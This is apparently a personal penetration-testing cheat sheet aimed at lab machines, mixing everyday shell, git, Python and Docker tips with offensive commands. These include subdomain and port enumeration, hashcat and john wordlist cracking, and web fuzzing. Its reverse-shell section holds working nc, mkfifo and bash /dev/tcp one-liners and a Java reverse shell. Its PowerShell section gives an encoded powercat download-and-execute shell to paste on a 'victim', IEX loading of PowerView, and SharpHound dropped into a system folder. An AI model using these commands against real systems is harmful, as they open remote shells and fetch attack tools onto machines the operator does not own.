# Commands

## vi (setup)

```sh
cat /etc/vim/vimrc.local 
set paste
set cursorline
set number
```

## Bash

```sh
ctrl-r: search through command history, right arrow key to put match on the command line, repeat ctrl-r to cycle through more results 
ctrl-w: delete the last word
ctrl-u: delete the content from current cursor back to the start of the line
ctrl-k: kill to the end of the line 
ctrl-a: move cursor to beginning of line  
ctrl-e: move cursor to end of line 
ctrl-l: clear the screen. 
ctrl-<arrow-keys>: move by word
```

## Git

```sh
git branch -a
git checkout master
git pull
git checkout -b <New_branch_name>
git push origin <new_branch_name_you_created>
```

## DNS enumeration

```sh
# subdomain brute force
dnsenum --threads 64 --dnsserver 10.11.12.13 -f SecLists/Discovery/DNS/subdomains-top1million-5000.txt youdomain.com
# DNS zone transfer
dig axfr yourdomain.com @10.11.12.13
```

## Port Enumeration 

```sh
sudo masscan -p1-65535 10.10.10.77 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
sudo nmap -Pn -sV -sC -p$ports 10.10.10.77 -oA nmap
```
### Using proxychains

```sh
sudo proxychains nmap -sT -p22 -n 192.168.1.0/24
```


## Generate Wordlist for hashcat or john

<https://github.com/stealthsploit/Optimised-hashcat-Rule>

```sh
echo "Summer2021" | hashcat -r OneRuleToRuleThemAll.rule --stdout > wordlist.txt
# John
john --wordlist=wordlist.txt hash.txt
# hashcat
hashcat -m <format_id> hash.txt wordlist.txt --force # foramt_id, e.g. 18200, see link below
```
<https://hashcat.net/wiki/doku.php?id=example_hashes>

## Web

```sh
# web-content discovery
feroxbuster -u http://10.10.10.110:8080 # very fast, configure your wordlist in /etc/feroxbuster/ferox-config.toml 
gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -l -t 30 -e -k -x .html,.php -u http://example.com -o gob_raft_80.txt
# subdomains
gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com -o gob_vhost_80.txt
# fuzz host header
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.15/ -H "Host: FUZZ.example.com" -mc 200 -c
```

## Find

```sh
find / -perm -4000 2> /dev/null
grep -iR "pass" * | more
```

## PYTHON

```sh
mkdir environment
cd environment
python3 -m venv my_env
source my_env/bin/activate

# Alternative:
virtualenv my_env
source my_env/bin/activate
```

## tcpdump
```sh
# to verify that your machine gets ping'ed (e.g. by your malicious remote "ping" command)
sudo tcpdump ip proto \\icmp -i tun0
```
## Reverse shells

### Shell
```sh
# Works most of the time, useful when nc has no -e option
/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 8621 >/tmp/f
# Depends on the netcat version (some do not have -e)
nc -e /bin/sh 10.10.14.5 8621
# Try it, depends on bash
bash -c "bash -i >& /dev/tcp/10.10.14.5/8621 0>&1"
```
### Java

```java
public class RuntimeDemo {

   public static void main(String[] args) {
      try {

         String[] cmdArray = {"/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/8622;cat <&5 | while read line; do $line 2>&5 >&5; done"};
         Process process = Runtime.getRuntime().exec(cmdArray,null);
      } catch (Exception ex) {
         ex.printStackTrace();
      }
   }
}
```

## Socat

```sh
# Tunnel a connection from a local TCP port to a remote service
socat -v tcp4-listen:8000,reuseaddr,fork tcp4:10.10.12.15:80 
```

## Powershell

### Encoded commands

```powershell
$command="ping -n 3 10.10.10.10"
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
powershell.exe -encoded $Encoded
```
Reverse Shell with powercat

This downloads powercat from your webserver on port 9000 and calls back to you local listener (nc -nvlp 1234) 

```powershell
$command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
```
The command can be prepared locally and copy/pasted to the victim, the just run:

```
powershell.exe -encoded <base64 string from $Encoded above here>
```

Port Scanning

```powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("localhost", $_)) "Port $_ is open!"} 2>$null
```

Downloading

```powershell
$url="http://10.10.14.13:9000/SharpHound.exe"
$output="C:\Windows\System32\spool\drivers\color\SharpHound.exe"
(New-object system.net.webclient).downloadfile($url,$output)

(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:9000/PowerUp.ps1", "C:\Windows\System32\spool\drivers\color\PowerUp.ps1")
```

Reflective Downloading

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.7:9000/PowerView.ps1')
```

Size of Folder

```powershell
"{0} MB" -f ((Get-ChildItem C:\users\ -Recurse -force | Measure-Object -Property Length -Sum -ErrorAction Stop).Sum / 1MB)
```

Compress

```powershell
Compress-Archive -LiteralPath <PathToFolder> -DestinationPath <PathToDestination>
```
Find Files

```powershell
gci -force -recurse -file -ea silentlycontinue  

Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -force -ErrorAction SilentlyContinue

FindDate=Get-Date -Year 2016 -Month 06 -Day 24
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate -and $_.LastWriteTime -le $Finddate.adddays(1) }
```
## Docker
 
```sh
docker pull nginx:1.19.4-alpine
docker images
docker run --name my-nginx -d -p 9080:80 nginx:1.19.4-alpine # -d: detached mode
docker logs -f my-nginx # -f: like tail -f, follow the log
docker inspect my-nginx

# Having a Dockerfile

docker build -t xxx:yyy .

# Running

docker ps # running containers
docker ps -a  # also not running
docker ps -q # quite, only IDs

docker start [container]
docker stop [container]
docker restart [container]

docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

docker exec -ti my-nginx /bin/sh
docker run -ti --rm --name my-ngnix nginx:1.19.4-alpine /bin/sh

# Mount folder

docker run -ti --rm --name my-ngnix -v /home/kali:/mnt nginx:1.19.4-alpine /bin/sh 

# Dangling images

docker images --filter "dangling=true"
docker rmi $(docker images -q --filter "dangling=true")

docker system prune -a

# History
docker history nginx:1.19.4-alpine
```

## Useful links

<https://github.com/swisskyrepo/PayloadsAllTheThings>

<https://book.hacktricks.xyz/>

<https://gtfobins.github.io/>

<https://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md>

<https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf>

